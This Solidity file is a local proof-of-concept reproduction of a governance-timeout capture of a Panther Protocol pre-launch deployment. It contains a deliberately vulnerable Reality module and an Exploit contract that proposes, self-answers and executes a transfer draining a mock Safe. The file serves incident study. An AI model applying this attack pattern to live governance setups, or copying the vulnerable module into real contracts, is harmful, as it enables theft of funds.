// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// ─────────────────────────────────────────────────────────────────────────────
// Faithful minimal reproduction of the Panther Protocol (ZKP) governance-timeout
// capture on Base (2026-08). Basis: DeFiHackLabs PR #1209
// (src/test/2026-08/PantherBase_exp.sol). ~5.12M ZKP moved out of the pre-launch
// deployment's own governance-controlled proxies.
//
// FRAMING: Panther's Base deployment was NOT yet in production; per the team, NO
// live user funds were compromised — a pre-launch governance-mechanism failure,
// not a drain of an operating protocol. Same class as the StrongBlock PoC already
// in this repo: capture a proxy/upgrade authority, then abuse it. NO code bug and
// NO stolen key — the path is entirely permissionless:
//   (1) anyone submits a Reality.eth / Zodiac governance proposal,
//   (2) bonds a "yes" answer to their OWN proposal,
//   (3) executes it once finalized.
// The only thing exploited was that nobody posted a competing "no" bond inside the
// challenge window, so an unopposed self-answer finalized and executed. The missing
// safeguard: the Reality.eth module was not disabled while there was no active
// governance proposal.
//
// Time is modelled with a settable clock (the browser EVM cannot vm.warp); the 12h
// question timeout is advanced explicitly. Local deploy, no fork.
// ─────────────────────────────────────────────────────────────────────────────

interface IERC20 {
    function balanceOf(address a) external view returns (uint256);
    function transfer(address to, uint256 a) external returns (bool);
    function transferFrom(address from, address to, uint256 a) external returns (bool);
    function approve(address s, uint256 a) external returns (bool);
}

// ZKP (Panther) token double.
contract ZKP is IERC20 {
    string public name = "Panther"; string public symbol = "ZKP";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    function mint(address to, uint256 a) external { balanceOf[to] += a; totalSupply += a; }
    function approve(address s, uint256 a) external returns (bool) { allowance[msg.sender][s] = a; return true; }
    function transfer(address to, uint256 a) external returns (bool) { balanceOf[msg.sender] -= a; balanceOf[to] += a; return true; }
    function transferFrom(address f, address to, uint256 a) external returns (bool) {
        uint256 al = allowance[f][msg.sender];
        if (al != type(uint256).max) allowance[f][msg.sender] = al - a;
        balanceOf[f] -= a; balanceOf[to] += a; return true;
    }
}

// The Panther Safe (avatar) — holds the governance-controlled ZKP. It executes
// arbitrary calls ONLY on behalf of its governance module.
contract Safe {
    address public module;
    function setModule(address m) external { module = m; }
    function execTransactionFromModule(address to, bytes calldata data) external returns (bool ok) {
        require(msg.sender == module, "only module");
        (ok, ) = to.call(data);
        require(ok, "exec failed");
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE Zodiac RealityModule — permissionless propose + self-answer + execute,
// with NO safeguard against an unopposed self-answered proposal finalizing.
// ─────────────────────────────────────────────────────────────────────────────
contract RealityModule {
    Safe public avatar;
    uint256 public questionTimeout = 43200; // 12h
    uint256 public minimumBond = 5e17;       // 0.5 ETH (modelled notionally)

    struct Q { address asker; bool answerYes; uint256 finalizeAt; bool executed; }
    mapping(uint256 => Q) public questions;
    uint256 public nextQ;

    // settable clock (browser EVM cannot vm.warp)
    uint256 public nowTs;
    function setNow(uint256 t) external { nowTs = t; }
    function _now() internal view returns (uint256) { return nowTs == 0 ? block.timestamp : nowTs; }

    constructor(Safe _avatar) { avatar = _avatar; }

    // Anyone can ask a governance question (permissionless).
    function ask() external returns (uint256 id) { id = ++nextQ; questions[id].asker = msg.sender; }

    // @> VULN: anyone can bond a "yes" answer to their OWN question; there is no
    // safeguard requiring a competing bond or an active governance proposal, so an
    // unopposed self-answer simply finalizes after the timeout.
    function answerYesWithBond(uint256 id /* bond paid notionally */) external {
        Q storage q = questions[id];
        q.answerYes = true;
        q.finalizeAt = _now() + questionTimeout; // @> VULN: unopposed self-answer finalizes with no challenge required
    }

    // Once finalized (timeout elapsed, no competing bond), execute the arbitrary
    // avatar call the asker wants.
    function executeProposal(uint256 id, address to, bytes calldata data) external {
        Q storage q = questions[id];
        require(q.answerYes && _now() >= q.finalizeAt && !q.executed, "not finalized");
        q.executed = true;
        avatar.execTransactionFromModule(to, data); // capture the fund-holding avatar's authority
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver: propose, self-answer yes, advance past the timeout, execute a
// ZKP transfer out of the governance-controlled Safe.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    uint256 internal constant ZKP_AMOUNT = 5120000e18; // ~5.12M ZKP moved on-chain

    ZKP public zkp;              // n1 (profit token)
    Safe public safe;           // n2
    RealityModule public module; // n3 (VULN)

    uint256 public moved;
    uint256 public profit;

    constructor() {
        zkp = new ZKP();               // n1
        safe = new Safe();             // n2
        module = new RealityModule(safe); // n3
        safe.setModule(address(module));

        // The pre-launch Safe holds the governance-controlled ZKP.
        zkp.mint(address(safe), ZKP_AMOUNT);
    }

    function run() external {
        uint256 before = zkp.balanceOf(address(this));

        // 1) submit a governance proposal and 2) self-answer "yes" with the bond.
        uint256 id = module.ask();
        module.answerYesWithBond(id);

        // 3) no competing "no" bond is posted; advance past the 12h timeout so the
        //    unopposed self-answer finalizes (browser EVM cannot vm.warp).
        module.setNow(block.timestamp + 43201);

        // 4) execute the captured authority: move the Safe's ZKP to the attacker.
        bytes memory data = abi.encodeWithSelector(IERC20.transfer.selector, address(this), ZKP_AMOUNT);
        module.executeProposal(id, address(zkp), data);

        uint256 got = zkp.balanceOf(address(this));
        moved = got - before;
        profit = moved;
        require(profit == ZKP_AMOUNT, "capture mismatch");
    }
}
